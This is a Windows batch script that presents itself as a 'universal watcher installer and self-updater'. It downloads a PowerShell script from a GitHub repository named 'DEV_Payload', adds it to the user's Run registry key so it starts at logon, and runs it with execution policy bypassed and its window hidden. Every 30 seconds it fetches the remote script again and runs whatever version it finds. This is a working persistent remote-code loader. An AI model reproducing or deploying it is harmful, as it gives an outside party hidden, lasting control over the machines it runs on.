@echo off
:: ===============================================
:: UNIVERSAL WATCHER INSTALLER + SELF-UPDATER
:: ===============================================

:: Define variables
set "BOOTSTRAP=%APPDATA%\UniversalBatInstaller_Dynamic_15E1362D_E98B_4386_9CA9.ps1"
set "SCRIPT_URL=https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1"
set "REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=UniversalWatcherPS1"

:: First-time setup: download latest script
echo Downloading latest script to "%BOOTSTRAP%"...
powershell -Command ^
    "$wc = New-Object System.Net.WebClient; " ^
    "$wc.Headers.Add('User-Agent','Bootstrapper'); " ^
    "$remote = $wc.DownloadString('%SCRIPT_URL%'); " ^
    "Set-Content -Path '%BOOTSTRAP%' -Value $remote"

:: Register autorun key
echo Registering autorun key...
reg add "%REG_PATH%" /v "%REG_NAME%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%BOOTSTRAP%\"" /f

:: Main loop: check every 30 seconds
:loop
:: Download latest GitHub content into temp file
set "TMPFILE=%TEMP%\temp_watcher.ps1"
powershell -Command ^
    "$wc = New-Object System.Net.WebClient; " ^
    "$wc.Headers.Add('User-Agent','Updater'); " ^
    "$remote = $wc.DownloadString('%SCRIPT_URL%'); " ^
    "Set-Content -Path '%TMPFILE%' -Value $remote"

:: Read content of TMPFILE
setlocal EnableDelayedExpansion
set "CONTENT_REMOTE="
for /f "usebackq delims=" %%A in ("%TMPFILE%") do (
    set "line=%%A"
    set "CONTENT_REMOTE=!CONTENT_REMOTE!!line!"
)

:: Read content of BOOTSTRAP
set "CONTENT_LOCAL="
for /f "usebackq delims=" %%A in ("%BOOTSTRAP%") do (
    set "line=%%A"
    set "CONTENT_LOCAL=!CONTENT_LOCAL!!line!"
)

:: Debug output (optional)
echo.
echo [INFO] Comparing file contents...
:: Uncomment if you want to see contents
:: echo Remote content: !CONTENT_REMOTE!
:: echo Local content : !CONTENT_LOCAL!

:: Compare contents
if "!CONTENT_REMOTE!"=="!CONTENT_LOCAL!" (
    echo No changes detected. Running local script...
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"
) else (
    echo Detected change in remote script. Refreshing local copy and autorun key...

    del /f /q "%BOOTSTRAP%"
    reg delete "%REG_PATH%" /v "%REG_NAME%" /f

    copy /y "%TMPFILE%" "%BOOTSTRAP%"

    reg add "%REG_PATH%" /v "%REG_NAME%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%BOOTSTRAP%\"" /f

    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"
)

:: Clean up temp file
del /f /q "%TMPFILE%"

:: Wait before next check
timeout /t 30 >nul
goto loop
